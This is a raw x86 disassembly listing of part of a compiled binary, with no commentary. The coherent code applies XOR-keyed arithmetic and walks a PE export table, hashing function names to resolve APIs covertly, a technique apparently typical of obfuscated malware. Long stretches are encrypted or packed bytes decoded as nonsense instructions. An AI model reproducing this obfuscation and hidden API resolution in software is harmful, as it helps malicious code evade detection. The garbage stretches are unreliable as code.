  41034f:	jne    0x410360
  410355:	mov    eax,ds:0x433733
  41035a:	inc    eax
  41035b:	mov    ds:0x433733,eax
  410360:	cmp    DWORD PTR ds:0x433733,0x18
  410367:	jb     0x410325
  41036d:	xor    eax,0x75f4
  410372:	xor    edi,edi
  410374:	mov    eax,ds:0x4336e3
  410379:	sbb    eax,DWORD PTR ds:0x433763
  41037f:	mov    ds:0x4336e3,eax
  410384:	add    ecx,ebx
  410386:	movzx  eax,BYTE PTR ds:0x4336ab
  41038d:	mov    DWORD PTR [ebp-0x20],ecx
  410390:	mov    eax,DWORD PTR [ebp-0x20]
  410393:	mov    DWORD PTR ds:0x433667,0x63b9
  41039d:	je     0x410967
  4103a3:	and    DWORD PTR ds:0x433647,0x0
  4103ad:	jmp    0x4103c0
  4103b2:	xor    eax,eax
  4103b4:	xor    eax,DWORD PTR ds:0x433647
  4103ba:	inc    eax
  4103bb:	mov    ds:0x433647,eax
  4103c0:	cmp    DWORD PTR ds:0x433647,0x14
  4103c7:	jae    0x410465
  4103cd:	cmp    DWORD PTR ds:0x433647,0xd
  4103d4:	jne    0x4103e6
  4103da:	push   DWORD PTR [ebp-0x20]
  4103dd:	push   DWORD PTR [ebp-0x18]
  4103e0:	call   DWORD PTR ds:0x412288
  4103e6:	cmp    DWORD PTR ds:0x433647,0xc
  4103ed:	jne    0x4103fe
  4103f3:	mov    eax,ds:0x433647
  4103f8:	inc    eax
  4103f9:	mov    ds:0x433647,eax
  4103fe:	jmp    0x4103b2
  410403:	mov    DWORD PTR ds:0x433757,0x1e
  41040d:	cmp    DWORD PTR ds:0x433757,0x0
  410414:	je     0x410465
  41041a:	cmp    DWORD PTR ds:0x433757,0x4
  410421:	jne    0x41043a
  410427:	push   DWORD PTR [ebp-0xc]
  41042a:	push   0x433974
  41042f:	push   0x43365f
  410434:	call   DWORD PTR ds:0x4121c4
  41043a:	cmp    DWORD PTR ds:0x433757,0x5
  410441:	jne    0x410452
  410447:	mov    eax,ds:0x433757
  41044c:	dec    eax
  41044d:	mov    ds:0x433757,eax
  410452:	xor    eax,eax
  410454:	add    eax,DWORD PTR ds:0x433757
  41045a:	dec    eax
  41045b:	mov    ds:0x433757,eax
  410460:	jmp    0x41040d
  410465:	mov    eax,DWORD PTR [ebp-0x4]
  410468:	xor    eax,0x7510853
  41046d:	sub    DWORD PTR ds:0x433757,0xdb8
  410477:	add    eax,ebx
  410479:	mov    DWORD PTR ds:0x4336a7,0x3f77
  410483:	cmp    edi,eax
  410485:	jne    0x4107cf
  41048b:	sub    DWORD PTR ds:0x43369b,0x29bd
  410495:	push   DWORD PTR [ebp+0x8]
  410498:	call   0x40f639
  41049d:	inc    ecx
  41049e:	mov    DWORD PTR [ebp-0x20],eax
  4104a1:	adc    DWORD PTR ds:0x4336e3,0xc37
  4104ab:	jmp    0x4105e6
  4104b0:	sbb    eax,0xb1fd9f18
  4104b5:	jge    0x410514
  4104b7:	fsub   DWORD PTR [edx+0xa]
  4104ba:	adc    ecx,ebx
  4104bc:	neg    DWORD PTR [eax]
  4104be:	sub    eax,0x7cbe9972
  4104c3:	jl     0x4104d7
  4104c5:	jg     0x410543
  4104c7:	jl     0x4104b0
  4104c9:	adc    ah,BYTE PTR [esi]
  4104cb:	scas   eax,DWORD PTR es:[edi]
  4104cc:	std    
  4104cd:	ins    BYTE PTR es:[edi],dx
  4104ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104cf:	les    edi,FWORD PTR [ecx+0x43577ef3]
  4104d5:	int    0x3f
  4104d7:	outs   dx,BYTE PTR ds:[esi]
  4104d8:	jl     0x410496
  4104da:	sub    eax,0x6ddf7745
  4104df:	fsin   
  4104e1:	scas   al,BYTE PTR es:[edi]
  4104e2:	xor    BYTE PTR [edi],ch
  4104e4:	int    0xf4
  4104e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104e7:	push   edx
  4104e8:	xchg   esp,eax
  4104e9:	and    DWORD PTR [eax],0x603e2fcc
  4104ef:	add    eax,0x96e23cbb
  4104f4:	cmp    DWORD PTR [bx+di+0x65c6],edi
  4104f9:	add    eax,0xd3512e7
  4104fe:	pop    eax
  4104ff:	gs cmp bl,al
  410502:	xor    eax,0x91304bfb
  410507:	(bad)  
  410508:	sub    al,0x59
  41050a:	imul   esp,DWORD PTR [ebx],0xb4747470
  410510:	cmp    al,dl
  410512:	test   DWORD PTR [esi],ecx
  410514:	mov    ebx,0xaeed5777
  410519:	jge    0x4104dc
  41051b:	ret    0xd4bc
  41051e:	xchg   BYTE PTR [ebp-0xaef37f6],ah
  410524:	clc    
  410525:	sbb    bl,cl
  410527:	adc    DWORD PTR [edx-0x1c],edi
  41052a:	mov    ah,0x54
  41052c:	xor    BYTE PTR [ebx-0x27],al
  41052f:	in     al,dx
  410530:	and    al,BYTE PTR [edi-0x7b]
  410533:	jne    0x410550
  410535:	mov    dl,BYTE PTR [edx+0x5f60459c]
  41053b:	sub    cl,BYTE PTR [edi]
  41053d:	adc    al,0x82
  41053f:	(bad)  
  410540:	aas    
  410541:	rcr    edi,1
  410543:	and    eax,0xe76df78a
  410548:	pop    ss
  410549:	sahf   
  41054a:	fs jne 0x410516
  41054d:	imul   esi,DWORD PTR [esi+0x70],0x3101037b
  410554:	repnz push edx
  410556:	mov    cl,0xcf
  410558:	cs ja  0x4104e2
  41055b:	fsubr  st,st(2)
  41055d:	rcl    bh,1
  41055f:	fild   DWORD PTR [ebx-0x46]
  410562:	and    dh,BYTE PTR [ebx+0x33]
  410565:	aad    0x35
  410567:	dec    eax
  410568:	dec    edi
  410569:	push   0xffffffee
  41056b:	cmp    eax,0xc9214243
  410570:	ins    BYTE PTR es:[edi],dx
  410571:	in     eax,0x71
  410573:	out    0x67,eax
  410575:	test   DWORD PTR [esi-0x7856706b],edi
  41057b:	jae    0x410584
  41057d:	mov    ds:0xd13bb04,eax
  410582:	push   ebx
  410583:	mov    cl,BYTE PTR [edx-0x764475e8]
  410589:	int    0xae
  41058b:	and    ah,dl
  41058d:	daa    
  41058e:	pop    ebx
  41058f:	xor    dl,BYTE PTR [ebx-0x6d4adb55]
  410595:	dec    esi
  410596:	xor    al,BYTE PTR [edx+eax*2+0x1e206932]
  41059d:	in     al,0x8f
  41059f:	aas    
  4105a0:	std    
  4105a1:	dec    ecx
  4105a2:	inc    eax
  4105a3:	pop    eax
  4105a4:	push   esp
  4105a5:	call   DWORD PTR [ebp-0x62]
  4105a8:	sar    BYTE PTR [eax-0x6f7dfb8e],cl
  4105ae:	inc    ebp
  4105af:	aam    0xfc
  4105b1:	imul   ebp,DWORD PTR [edx],0xfffffff2
  4105b4:	add    DWORD PTR [ecx],edx
  4105b6:	jp     0x410628
  4105b8:	dec    edx
  4105b9:	mov    ch,0x2f
  4105bb:	mov    al,ds:0x8cb19347
  4105c0:	rcr    DWORD PTR [ecx+0x46],1
  4105c3:	pop    ds
  4105c4:	xchg   BYTE PTR [ecx],bl
  4105c6:	xchg   ebx,eax
  4105c7:	(bad)  
  4105c8:	dec    esp
  4105c9:	jmp    0x4105cc
  4105cb:	mov    DWORD PTR ds:0x96bd5114,eax
  4105d1:	push   eax
  4105d2:	and    ebx,esp
  4105d4:	jne    0x410560
  4105d6:	iret   
  4105d7:	call   0x5be1:0xfa02ff0e
  4105de:	and    eax,0x5426b84a
  4105e3:	mov    dh,0xe1
  4105e5:	out    dx,al
  4105e6:	mov    eax,DWORD PTR [ebp-0x4]
  4105e9:	sbb    DWORD PTR ds:0x4336d7,0x55ce
  4105f3:	mov    ecx,DWORD PTR [ebp-0x20]
  4105f6:	adc    DWORD PTR ds:0x43364f,ebx
  4105fc:	mov    esi,0x7510853
  410601:	xor    eax,esi
  410603:	dec    DWORD PTR ds:0x43372f
  410609:	add    eax,ebx
  41060b:	cmp    ecx,eax
  41060d:	je     0x41094b
  410613:	add    DWORD PTR ds:0x43372f,0x3520
  41061d:	push   DWORD PTR [ebp-0x20]
  410620:	push   DWORD PTR [ebp+0x8]
  410623:	call   0x405227
  410628:	mov    DWORD PTR [ebp-0x14],eax
  41062b:	adc    eax,ecx
  41062d:	mov    eax,DWORD PTR [ebp-0x4]
  410630:	and    DWORD PTR ds:0x4336df,edi
  410636:	jmp    0x410771
  41063b:	pop    ss
  41063c:	imul   ecx,DWORD PTR ds:0x7d706d64,0xb02edf69
  410646:	loope  0x41061b
  410648:	(bad)  
  410649:	dec    esi
  41064a:	outs   dx,BYTE PTR ds:[esi]
  41064b:	mov    edi,0x127c7cb9
  410650:	jg     0x4106ce
  410652:	jl     0x410620
  410654:	aaa    
  410655:	mov    bh,0xed
  410657:	fimul  WORD PTR [ebx+0x7e]
  41065a:	mov    eax,ds:0xf95f1898
  41065f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410660:	bound  eax,QWORD PTR [edi-0x60]
  410663:	test   al,0xe8
  410665:	and    eax,DWORD PTR [edi]
  410667:	out    dx,eax
  410668:	push   edi
  410669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41066a:	imul   ebx,DWORD PTR [edi+0x3c],0x46
  41066e:	and    BYTE PTR [eax-0xa],0x71
  410672:	and    DWORD PTR [edx-0x5e],0xee3c361e
  410679:	stos   BYTE PTR es:[edi],al
  41067a:	and    dh,BYTE PTR [edx-0x24]
  41067d:	nop
  41067e:	repnz icebp 
  410680:	sub    eax,0x3f9e958b
  410685:	ss iret 
  410687:	mov    bl,0x29
  410689:	sub    cl,BYTE PTR [ecx-0x6a67d52d]
  41068f:	mov    dl,0x3a
  410691:	pop    ecx
  410692:	in     al,dx
  410693:	mov    BYTE PTR ss:[ebx+edi*1-0xd],dl
  410698:	cdq    
  410699:	sbb    BYTE PTR [eax+edx*2-0x55],bl
  41069d:	daa    
  41069e:	push   ebx
  41069f:	or     DWORD PTR [esi+0x3a9207eb],edi
  4106a5:	xor    edi,esi
  4106a7:	in     al,0x4c
  4106a9:	and    dh,BYTE PTR [edx-0x59]
  4106ac:	xchg   BYTE PTR [edi+0x12],dh
  4106af:	clc    
  4106b0:	xchg   ecx,eax
  4106b1:	int    0xea
  4106b3:	fidivr WORD PTR [edi]
  4106b5:	add    eax,0x72a1b873
  4106ba:	jns    0x4106c5
  4106bc:	call   0x5c254de5
  4106c1:	and    al,0x31
  4106c3:	mov    al,0xb6
  4106c5:	sbb    bl,bh
  4106c7:	adc    al,0xdc
  4106c9:	dec    esi
  4106ca:	das    
  4106cb:	and    ecx,DWORD PTR [ebp+0x44465197]
  4106d1:	or     bh,dl
  4106d3:	shl    ebp,cl
  4106d5:	jle    0x4106bb
  4106d7:	add    ch,bl
  4106d9:	xchg   ecx,eax
  4106da:	(bad)  
  4106db:	push   esi
  4106dc:	and    esp,DWORD PTR [eax-0x66]
  4106df:	addr16 sub ax,0xa6bd
  4106e4:	rcl    BYTE PTR [eax],1
  4106e6:	test   esi,edi
  4106e8:	bound  ebx,QWORD PTR [edx-0x67]
  4106eb:	mov    edi,esp
  4106ed:	idiv   BYTE PTR [ebp+0x1ce1823b]
  4106f3:	or     cl,BYTE PTR [eax]
  4106f5:	xchg   ecx,eax
  4106f6:	out    dx,al
  4106f7:	daa    
  4106f8:	test   bl,dh
  4106fa:	add    DWORD PTR [ecx+0x36],esp
  4106fd:	ds mov ecx,DWORD PTR ss:[esi]
  410701:	(bad)  
  410702:	mov    WORD PTR [ebx+eiz*2],fs
  410705:	mov    eax,0xda767c80
  41070a:	aaa    
  41070b:	cmp    esp,DWORD PTR [edx]
  41070d:	mov    esi,0x8336af5a
  410712:	(bad)
  410715:	xor    al,0xa5
  410717:	and    DWORD PTR [ebx+ebx*4-0x1a],edi
  41071b:	imul   ebx,esi,0x89410377
  410721:	sub    al,0xc4
  410723:	(bad)
  410726:	out    dx,al
  410727:	lahf   
  410728:	mov    dh,0x64
  41072a:	jl     0x41078a
  41072c:	jle    0x4106b4
  41072e:	call   0xf5e9:0xc7d9e862
  410735:	(bad)  
  410736:	jmp    0x4106c6
  410738:	enter  0x8085,0x57
  41073c:	retf   
  41073d:	mov    esp,0xdd4e81e
  410742:	xchg   ebp,eax
  410743:	mov    cl,0x48
  410745:	xor    al,0x30
  410747:	mov    ecx,0xab8e79b5
  41074c:	not    ecx
  41074e:	test   eax,0x9b29a786
  410753:	and    al,0x1d
  410755:	lahf   
  410756:	adc    BYTE PTR [eax-0x6e289cc],bh
  41075c:	or     al,0x7b
  41075e:	jmp    0x7ec2:0xa52ce63b
  410765:	adc    ecx,ebp
  410767:	jb     0x41070f
  410769:	mov    ds,WORD PTR [ecx-0x637275df]
  41076f:	call   0x581:0xec4d8b77
  410776:	addr16 ss inc ebx
  410779:	add    BYTE PTR [ecx+0x33000039],cl
  41077f:	mov    BYTE PTR [ecx+0x4336631d],0x0
  410786:	dec    edi
  410787:	ss inc ebx
  410789:	add    BYTE PTR [ebx],al
  41078b:	ret    
  41078c:	cmp    ecx,eax
  41078e:	je     0x41094b
  410794:	mov    eax,DWORD PTR [ebp-0x14]
  410797:	xor    DWORD PTR ds:0x4336a3,edi
  41079d:	mov    eax,DWORD PTR [eax+0x18]
  4107a0:	sub    ecx,DWORD PTR ds:0x433763
  4107a6:	mov    DWORD PTR [ebp-0x20],eax
  4107a9:	mov    eax,DWORD PTR [ebp-0x14]
  4107ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4107af:	add    ecx,DWORD PTR [eax+0x20]
  4107b2:	mov    DWORD PTR [ebp-0x28],ecx
  4107b5:	mov    eax,DWORD PTR [ebp-0x14]
  4107b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4107bb:	add    ecx,DWORD PTR [eax+0x24]
  4107be:	mov    DWORD PTR [ebp-0x2c],ecx
  4107c1:	mov    eax,DWORD PTR [ebp-0x14]
  4107c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4107c7:	add    ecx,DWORD PTR [eax+0x1c]
  4107ca:	xor    esi,esi
  4107cc:	mov    DWORD PTR [ebp-0x14],ecx
  4107cf:	mov    eax,DWORD PTR [ebp-0x28]
  4107d2:	jmp    0x41090d
  4107d7:	push   ebp
  4107d8:	xchg   esi,eax
  4107d9:	ins    BYTE PTR es:[edi],dx
  4107da:	stos   DWORD PTR es:[edi],eax
  4107db:	jae    0x41085a
  4107dd:	push   ebp
  4107de:	jbe    0x4107cf
  4107e0:	mov    ds:0x3d32ac5a,eax
  4107e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107e6:	dec    esi
  4107e7:	pop    ebp
  4107e8:	mov    eax,0x7f127c7c
  4107ed:	jl     0x41086b
  4107ef:	fsub   QWORD PTR [ebx-0x5d866352]
  4107f5:	jl     0x41080e
  4107f7:	mov    ds:0x2b46c3e0,al
  4107fc:	inc    esp
  4107fd:	pop    ds
  4107fe:	dec    ecx
  4107ff:	and    ecx,DWORD PTR [esi+0x1590ca67]
  410805:	nop
  410806:	rcr    DWORD PTR [edx],0x31
  410809:	rcl    esi,cl
  41080b:	sub    al,0xe2
  41080d:	shl    BYTE PTR [ecx-0x74],cl
  410810:	xor    esi,DWORD PTR [ecx]
  410812:	mov    ds:0xc448d0ba,al
  410817:	leave  
  410818:	(bad)  
  410819:	and    DWORD PTR [edx-0x48],ebx
  41081c:	jbe    0x410866
  41081e:	inc    esi
  41081f:	jmp    0x410848
  410821:	xchg   ecx,eax
  410822:	loope  0x410893
  410824:	in     eax,0xd0
  410826:	and    al,0x7e
  410828:	hlt    
  410829:	out    dx,eax
  41082a:	xor    ch,BYTE PTR [edx]
  41082c:	push   eax
  41082d:	inc    edi
  41082e:	outs   dx,BYTE PTR ds:[esi]
  41082f:	popf   
  410830:	jmp    0x68ca:0xa30586f4
  410837:	jno    0x41084c
  410839:	cld    
  41083a:	add    edx,DWORD PTR [eax]
  41083c:	leave  
  41083d:	and    al,0xd9
  41083f:	fcomp  DWORD PTR [ecx]
  410841:	lock jb 0x41086a
  410844:	jmp    0xec9d:0x5fdf8307
  41084b:	pusha  
  41084c:	push   eax
  41084d:	sbb    al,0x66
  41084f:	and    DWORD PTR [edx+0xe53e77],esp
  410855:	cmp    ebp,esi
  410857:	jge    0x410861
  410859:	mov    bl,0xc7
  41085b:	test   BYTE PTR [edx+0x71e34ec6],cl
  410861:	adc    BYTE PTR [ebx+0x35fea7bb],0x5b
  410868:	aas    
  410869:	out    0x96,eax
  41086b:	mov    ebx,DWORD PTR [eax]
  41086d:	sbb    BYTE PTR [esi+0x76d5e5e2],bl
  410873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410874:	int3   
  410875:	loop   0x4108ae
  410877:	rol    edx,0x1e
  41087a:	bound  esi,QWORD PTR [esp+ebp*1-0xe61a475]
  410881:	ins    DWORD PTR es:[edi],dx
  410882:	(bad)  
  410883:	mov    esp,0xf86e4562
  410888:	cmp    dl,ah
  41088a:	ins    DWORD PTR es:[edi],dx
  41088b:	mov    DWORD PTR [ecx-0x5e],esi
  41088e:	daa    
  41088f:	repnz fs pop esp
  410892:	mov    ecx,0x1c10adeb
  410897:	jb     0x4108da
  410899:	dec    eax
  41089a:	lahf   
  41089b:	adc    al,0x65
  41089d:	sbb    al,0x26
  41089f:	out    0xe,al
  4108a1:	ret    0x2fd5
  4108a4:	hlt    
  4108a5:	mov    ebp,0x2c79cfe9
  4108aa:	ja     0x410876
  4108ac:	dec    ebp
  4108ad:	pop    ds
  4108ae:	push   esp
  4108af:	inc    ebx
  4108b0:	sbb    eax,0x188c1c19
  4108b5:	jmp    0x7559fc27
  4108ba:	mov    al,0xbe
  4108bc:	mov    ah,cl
  4108be:	dec    ebx
  4108bf:	inc    esp
  4108c0:	fdiv   QWORD PTR [ebx+0x1]
  4108c3:	loope  0x41085e
  4108c5:	pop    es
  4108c6:	cli    
  4108c7:	in     eax,0xa9
  4108c9:	and    BYTE PTR [ebx],0x86
  4108cc:	jp     0x410943
  4108ce:	sub    DWORD PTR [esp+ebx*4],edx
  4108d1:	cdq    
  4108d2:	xor    eax,0xe8315484
  4108d7:	bound  esi,QWORD PTR [ebp+0x1ef10261]
  4108dd:	sti    
  4108de:	mov    BYTE PTR [ebx+0x75],bh
  4108e1:	jmp    0xc5be:0x9816ec5d
  4108e8:	or     al,0x5d
  4108ea:	outs   dx,BYTE PTR ds:[esi]
  4108eb:	sub    esi,DWORD PTR [eax-0x5c]
  4108ee:	int3   
  4108ef:	cmp    ah,BYTE PTR [edx-0x1a]
  4108f2:	pop    esp
  4108f3:	push   0xfd259d24
  4108f8:	mov    ebx,0x745e1f9b
  4108fd:	sbb    ebp,DWORD PTR [edi]
  4108ff:	and    ebp,DWORD PTR [ebp-0x19]
  410902:	xchg   ebx,eax
  410903:	inc    eax
  410904:	cld    
  410905:	dec    edi
  410906:	lods   al,BYTE PTR ds:[esi]
  410907:	cli    
  410908:	es fs jp 0x410980
  41090c:	lahf   
  41090d:	mov    ecx,DWORD PTR [ebp+0x8]
  410910:	add    ecx,DWORD PTR [eax+edi*4]
  410913:	lea    eax,[ebp-0x8]
  410916:	mov    DWORD PTR [ebp-0x30],ecx
  410919:	push   eax
  41091a:	push   DWORD PTR [ebp-0x30]
  41091d:	push   DWORD PTR [ebp+0xc]
  410920:	call   0x4040e1
  410925:	mov    eax,DWORD PTR [ebp-0x4]
  410928:	mov    ecx,DWORD PTR [ebp-0x8]
  41092b:	xor    eax,0x7510853
  410930:	add    eax,ebx
  410932:	cmp    ecx,eax
  410934:	jne    0x410957
  41093a:	mov    eax,DWORD PTR [ebp-0x20]
  41093d:	inc    edi
  41093e:	cmp    edi,eax
  410940:	jb     0x4103a3
  410946:	jmp    0x410967
  41094b:	mov    eax,DWORD PTR [ebp-0x4]
  41094e:	xor    eax,esi
  410950:	add    eax,ebx
  410952:	jmp    0x41148d
  410957:	mov    eax,DWORD PTR [ebp-0x2c]
  41095a:	movzx  eax,WORD PTR [eax+edi*2]
  41095e:	mov    ecx,DWORD PTR [ebp-0x14]
  410961:	mov    eax,DWORD PTR [ecx+eax*4]
  410964:	mov    DWORD PTR [ebp+0xc],eax
  410967:	mov    eax,DWORD PTR [ebp-0x4]
  41096a:	mov    ecx,DWORD PTR [ebp-0x8]
  41096d:	xor    eax,0x7510853
  410972:	add    eax,ebx
  410974:	cmp    ecx,eax
  410976:	jne    0x410989
  41097c:	mov    eax,DWORD PTR [ebp-0x4]
  41097f:	xor    eax,0x7510853
  410984:	jmp    0x410950
  410989:	mov    eax,DWORD PTR [ebp+0xc]
  41098c:	jmp    0x410ac7
  410991:	inc    ebx
  410992:	fs dec edi
  410994:	fwait
  410995:	imul   esi,DWORD PTR [ebx-0x6cde9b8d],0x78
  41099c:	or     BYTE PTR [ebx+0x7382e936],ch
  4109a2:	mov    ebx,0x7f127c7c
  4109a7:	jl     0x410a25
  4109a9:	adc    BYTE PTR [ebx],0xd4
  4109ac:	xchg   esp,eax
  4109ad:	jo     0x4109e4
  4109af:	popa   
  4109b0:	fcom   DWORD PTR [ebx]
  4109b2:	or     DWORD PTR ds:0xc9bda70e,0x83a01954
  4109bc:	loop   0x410978
  4109be:	dec    edx
  4109bf:	sub    BYTE PTR [edi-0x7c],0x16
  4109c3:	add    ebx,esi
  4109c5:	hlt    
  4109c6:	dec    edi
  4109c7:	sub    eax,0xb04a539e
  4109cc:	push   ebp
  4109cd:	xor    DWORD PTR [ebx+esi*4-0x7b],esi
  4109d1:	mov    dl,0x97
  4109d3:	iret   
  4109d4:	fisubr WORD PTR [esi+0x4244827e]
  4109da:	jg     0x4109cd
  4109dc:	cwde   
  4109dd:	xchg   ebp,eax
  4109de:	fimul  DWORD PTR [ecx]
  4109e0:	ss into 
  4109e2:	dec    edi
  4109e3:	xlat   BYTE PTR ds:[ebx]
  4109e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109e5:	in     eax,0x61
  4109e7:	cmp    ah,ch
  4109e9:	aas    
  4109ea:	pop    esi
  4109eb:	xor    eax,0x9fa4cbc
  4109f0:	cdq    
  4109f1:	(bad)  [ebx-0x46]
  4109f4:	push   ecx
  4109f5:	push   cs
  4109f6:	cld    
  4109f7:	out    dx,eax
  4109f8:	cmp    bl,al
  4109fa:	pop    ecx
  4109fb:	pop    ecx
  4109fc:	leave  
  4109fd:	xor    al,0x48
  4109ff:	(bad)  
  410a00:	jmp    0x53a5:0xda90cf54
  410a07:	cli    
  410a08:	aam    0xed
  410a0a:	cmp    bh,BYTE PTR ds:0x2ca2984e
  410a10:	pop    eax
  410a11:	scas   al,BYTE PTR es:[edi]
  410a12:	sbb    al,0x2c
  410a14:	bound  esp,QWORD PTR [eax]
  410a16:	iret   
  410a17:	and    eax,0xa2017cfc
  410a1c:	in     al,dx
  410a1d:	out    dx,al
  410a1e:	push   eax
  410a1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a20:	cmp    al,0xb4
  410a22:	stos   DWORD PTR es:[edi],eax
  410a23:	retf   0xf601
  410a26:	aam    0x7c
  410a28:	adc    BYTE PTR [ecx+ecx*4+0x7fba3e48],al
  410a2f:	rol    BYTE PTR [edi+0x14bfbc85],cl
  410a35:	mov    DWORD PTR [edi-0x17f70107],eax
  410a3b:	cmp    BYTE PTR [eax],ah
  410a3d:	mov    WORD PTR [eax],?
  410a3f:	mov    al,0x45
  410a41:	pop    edi
  410a42:	jns    0x410a64
  410a44:	test   DWORD PTR [edx-0x31],edx
  410a47:	xor    BYTE PTR [ebx-0x56],cl
  410a4a:	xor    eax,0xce9f7247
  410a4f:	sub    edx,DWORD PTR [ecx+edx*8]
  410a52:	push   es
  410a53:	icebp  
  410a54:	fisttp QWORD PTR ds:0x1ba006eb
  410a5a:	mov    al,0x2a
  410a5c:	lds    eax,FWORD PTR [ebp-0x64bcad05]
  410a62:	shl    ebp,cl
  410a64:	inc    ecx
  410a65:	jp     0x410ac1
  410a67:	jmp    DWORD PTR [ecx]
  410a69:	push   es
  410a6a:	fiadd  WORD PTR [ebp+0x8]
  410a6d:	and    eax,0x11f7c944
  410a72:	cmp    BYTE PTR [edi],dh
  410a74:	test   DWORD PTR [ecx],0xd6b588ff
  410a7a:	shl    bl,1
  410a7c:	sbb    al,0xb1
  410a7e:	mov    WORD PTR [ebx+0x1e7eed00],ss
  410a84:	inc    eax
  410a85:	push   ds
  410a86:	jmp    DWORD PTR [esi]
  410a88:	sub    BYTE PTR [edi-0x102cb4bd],dh
  410a8e:	aad    0xd5
  410a90:	ffree  st(2)
  410a92:	add    eax,0xbe3204d9
  410a97:	adc    BYTE PTR [ecx+0x67],dl
  410a9a:	jnp    0x410a9e
  410a9c:	pop    es
  410a9d:	cld    
  410a9e:	push   esi
  410a9f:	lock pop ecx
  410aa1:	not    esi
  410aa3:	arpl   di,bx
  410aa5:	add    esp,DWORD PTR [edx+0x7a]
  410aa8:	sbb    DWORD PTR [edi],ecx
  410aaa:	out    0x75,eax
  410aac:	arpl   WORD PTR [esp+0x4],bx
  410ab0:	int    0xb5
  410ab2:	pop    es
  410ab3:	jl     0x410ae5
  410ab5:	and    DWORD PTR [ebx+0x1f],edi
  410ab8:	sub    bl,BYTE PTR [ebp-0x3509800d]
  410abe:	scas   eax,DWORD PTR es:[edi]
  410abf:	mov    eax,0x6d44196e
  410ac4:	cwde   
  410ac5:	cmp    eax,0x845030e
  410aca:	mov    DWORD PTR [ebp-0x10],eax
  410acd:	mov    eax,DWORD PTR [ebp-0x1c]
  410ad0:	test   eax,eax
  410ad2:	je     0x41108e
  410ad8:	mov    DWORD PTR [ebp-0x24],esi
  410adb:	push   0xb
  410add:	pop    ecx
  410ade:	push   0x5
  410ae0:	jmp    0x410c1b
  410ae5:	jbe    0x410ad6
  410ae7:	inc    edi
  410ae8:	xchg   DWORD PTR [ecx-0x49],eax
  410aeb:	jbe    0x410ad6
  410aed:	and    al,0x2e
  410aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410af0:	fsub   QWORD PTR [ebx+ebp*1+0x45113229]
  410af7:	jl     0x410b75
  410af9:	adc    bh,BYTE PTR [edi+0x7c]
  410afc:	jl     0x410a99
  410afe:	retf   
  410aff:	xchg   DWORD PTR [eax],ecx
  410b01:	bound  ebp,QWORD PTR [edx-0x21]
  410b04:	clc    
  410b05:	xchg   edi,eax
  410b06:	jnp    0x410b38
  410b08:	sbb    eax,0xfeb022c9
  410b0d:	push   ebp
  410b0e:	mov    ebx,0x7283184c
  410b13:	repnz rcr BYTE PTR [ecx+0x26],1
  410b17:	pop    es
  410b18:	jnp    0x410ae9
  410b1a:	inc    ecx
  410b1b:	jae    0x410b67
  410b1d:	fxch   st(5)
  410b1f:	mov    edx,0x8db05eda
  410b24:	rcl    DWORD PTR [eax-0x290c8cf1],1
  410b2a:	out    0x1,al
  410b2c:	out    dx,al
  410b2d:	hlt    
  410b2e:	jmp    0x7ecbe61b
  410b33:	repz mov ebp,0x1b9cf6a5
  410b39:	pop    esi
  410b3a:	lods   al,BYTE PTR ds:[esi]
  410b3b:	fs (bad) 
  410b3d:	iret   
  410b3e:	fcomp  DWORD PTR [esi+ecx*2]
  410b41:	jge    0x410b25
  410b43:	dec    edi
  410b44:	mov    ah,0x2
  410b46:	add    eax,0x35543c9a
  410b4b:	jno    0x410bb8
  410b4d:	enter  0x6e6a,0xf
  410b51:	lods   al,BYTE PTR ds:[esi]
  410b52:	lds    ebp,FWORD PTR [edi+ebx*4]
  410b55:	aaa    
  410b56:	jo     0x410b32
  410b58:	mov    ss:0x84e14886,al
  410b5e:	push   ebx
  410b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b60:	shr    DWORD PTR [esi-0x22],cl
  410b63:	imul   ebp,DWORD PTR [edx-0x2d417f5b],0xcd29cc08
  410b6d:	test   al,0xc3
  410b6f:	fnstenv [esi-0x6e]
  410b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b73:	sub    eax,0x8547cc72
  410b78:	xchg   esp,eax
  410b79:	dec    edi
  410b7a:	and    ecx,ebp
  410b7c:	push   edi
  410b7d:	push   esp
  410b7e:	lea    edx,[eax]
  410b80:	mov    WORD PTR ss:[edx+0x7f],ds
  410b84:	and    edx,esi
  410b86:	dec    edx
  410b87:	es leave 
  410b89:	cwde   
  410b8a:	ror    BYTE PTR [edx-0x30900df4],cl
  410b90:	pushf  
  410b91:	fcmovne st,st(0)
  410b93:	mov    ch,0xa2
  410b95:	and    bl,BYTE PTR [ebx]
  410b97:	jae    0x410b70
  410b99:	xor    BYTE PTR [bx+di-0x51],ch
  410b9d:	(bad)  
  410b9e:	retf   
  410b9f:	dec    ebx
  410ba0:	add    eax,DWORD PTR [ebx-0x52]
  410ba3:	cmp    al,bl
  410ba5:	fsubrp st(5),st
  410ba7:	test   esi,eax
  410ba9:	ins    DWORD PTR es:[edi],dx
  410baa:	stc    
  410bab:	jmp    esp
  410bad:	lock dec ecx
  410baf:	xchg   ebx,eax
  410bb0:	fs repz iret 
  410bb3:	xchg   esi,eax
  410bb4:	cmp    esi,ebp
  410bb6:	or     BYTE PTR [edi-0x333fb941],bh
  410bbc:	je     0x410ba1
  410bbe:	adc    BYTE PTR [eax-0x141688e6],ah
  410bc4:	lds    ebp,FWORD PTR [eax+edx*4]
  410bc7:	dec    ebp
  410bc8:	adc    al,0x6b
  410bca:	cwde   
  410bcb:	test   DWORD PTR [esi+ecx*8],ecx
  410bce:	jecxz  0x410b55
  410bd0:	fisub  DWORD PTR [edx+0x75161f72]
  410bd6:	div    edx
  410bd8:	or     al,0xd3
  410bda:	imul   esi,ecx,0x4a
  410bdd:	push   ss
  410bde:	sbb    eax,DWORD PTR [ecx-0x3f39606d]
  410be4:	mov    dl,0xf1
  410be6:	dec    edi
  410be7:	pop    edx
